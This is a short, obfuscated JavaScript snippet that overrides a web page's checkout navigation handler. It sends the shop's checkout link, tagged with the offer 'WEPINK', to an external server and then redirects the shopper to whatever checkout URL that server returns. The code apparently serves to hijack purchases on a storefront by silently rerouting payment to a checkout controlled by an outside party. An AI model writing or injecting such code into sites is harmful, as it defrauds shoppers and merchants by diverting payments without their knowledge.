(function overrideHandleNavigation() {
  const _interval = setInterval(() => {
    if (typeof window.handleNavigation === "function") {
      clearInterval(_interval);

      window.handleNavigation = async function () {
        const _a7d9s = document
          .getElementById("finalizarPedido")
          .getAttribute("href");

        try {
          const _b4e8q = await fetch(
            "https://tracker-api-tracker.v3bpu1.easypanel.host/checkout",
            {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({
                checkout: _a7d9s,
                offer: "WEPINK",
              }),
            }
          );

          const _k2s8d = await _b4e8q.json();

          if (_k2s8d && _k2s8d.checkout) {
            window.location.href = _k2s8d.checkout;
          } else {
            window.location.href = _a7d9s;
          }
        } catch (_e9x2) {
          console.error("ergo sum", _e9x2);
          window.location.href = _a7d9s;
        }
      };
    }
  }, 100);
})();


